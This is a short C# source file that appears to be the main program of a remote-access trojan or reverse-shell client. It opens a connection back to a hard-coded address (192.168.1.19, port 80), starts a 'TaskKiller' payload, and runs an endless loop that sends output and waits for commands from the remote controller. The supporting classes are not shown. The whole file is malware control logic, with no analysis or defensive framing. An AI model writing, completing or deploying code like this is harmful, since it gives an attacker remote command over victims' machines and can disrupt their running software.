using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;

namespace ISBD
{
    class Program
    {
        private static bool ourExitFlag;
        private static PayloadManager ourPayloadManager;
        private static Thread ourPayloadThread;
        private static string aCommand = "";

        static void Init()
        {
            ourExitFlag = true;
            ourPayloadManager = new PayloadManager();

            ourPayloadThread = new Thread(new ThreadStart(() =>
            {
                Timer.Update();
                ourPayloadManager.Update(Timer.GetDeltaTime());
            }));
            ourPayloadThread.Start();
            ReverseManager.Initialize(IPAddress.Parse("192.168.1.19"), 80);

            ourPayloadManager.Start(Payload.TaskKiller);
        }

        static void Main(string[] args)
        {
            Init();
            while (ourExitFlag)
            {
                Update();
            }
        }

        private static void Update()
        {
            ReverseManager.WriteStream(aCommand);
            aCommand = ReverseManager.WaitForCommand(); 
        }

        public static void Exit()
        {
            ourExitFlag = false;
        }
    }
}
